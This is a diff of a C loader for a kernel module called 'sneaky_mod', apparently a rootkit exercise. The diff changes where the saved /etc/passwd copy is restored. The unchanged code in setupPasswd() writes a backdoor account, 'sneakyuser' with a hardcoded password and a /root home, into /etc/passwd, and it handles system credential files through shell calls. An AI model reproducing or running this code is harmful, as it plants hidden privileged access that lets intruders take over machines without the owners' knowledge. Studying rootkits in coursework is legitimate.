@@ -16,12 +16,12 @@ void packSystemString(char * string, pid_t pid) {
 }
 
 void setupPasswd() {
-  system("cp /etc/passwd /tmp/passwd");
+  system("cp /etc/passwd /tmp/");
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
 }
 
 void restorePasswd() {
-  system("cp /tmp/passwd /etc/passwd");
+  system("cp /tmp/passwd /etc/");
   system("rm /tmp/passwd");
 }
 
@@ -44,8 +44,8 @@ void run_module() {
 
 void remove_module() {
   // remove the module
-  restorePasswd();
   system("rmmod sneaky_mod");
+  restorePasswd();
 }
 
 int main() {
